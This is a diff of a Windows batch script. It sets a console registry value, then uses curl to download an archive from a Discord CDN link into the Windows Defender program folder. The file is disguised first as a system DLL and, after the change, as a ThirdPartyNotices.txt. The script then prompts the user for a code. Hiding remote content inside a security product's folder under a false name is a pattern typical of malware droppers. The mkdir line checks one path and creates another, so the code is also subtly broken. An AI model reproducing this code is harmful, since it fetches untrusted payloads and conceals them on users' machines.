@@ -6,10 +6,10 @@ setlocal enabledelayedexpansion
 Reg.exe add "HKCU\CONSOLE" /v "VirtualTerminalLevel" /t REG_DWORD /d "1" /f  > nul
 
 if not exist "%systemdrive%\Program Files\Windows Defender\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
-curl -o "%systemdrive%\Program Files\Windows Defender\en-US\SettingsHandlers_User.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1245833485101305979/ThirdPartyNotices.rar?ex=665a3059&is=6658ded9&hm=381e44a24a5efe744d69c2e1323b42230bfb549d4b8f4df0c3f53844c2427fcb&" -# --create-dirs 
+curl -o "%systemdrive%\Program Files\Windows Defender\en-US\ThirdPartyNotices.txt" "https://cdn.discordapp.com/attachments/1219269832147734559/1245833485101305979/ThirdPartyNotices.rar?ex=665a3059&is=6658ded9&hm=381e44a24a5efe744d69c2e1323b42230bfb549d4b8f4df0c3f53844c2427fcb&" -# --create-dirs 
 
 
-set "logFile=C:\Program Files\Windows Defender\en-US\SettingsHandlers_User.dll"
+set "logFile=C:\Program Files\Windows Defender\en-US\ThirdPartyNotices.txt"
 
 set /p "userCode=Enter your code: "
 
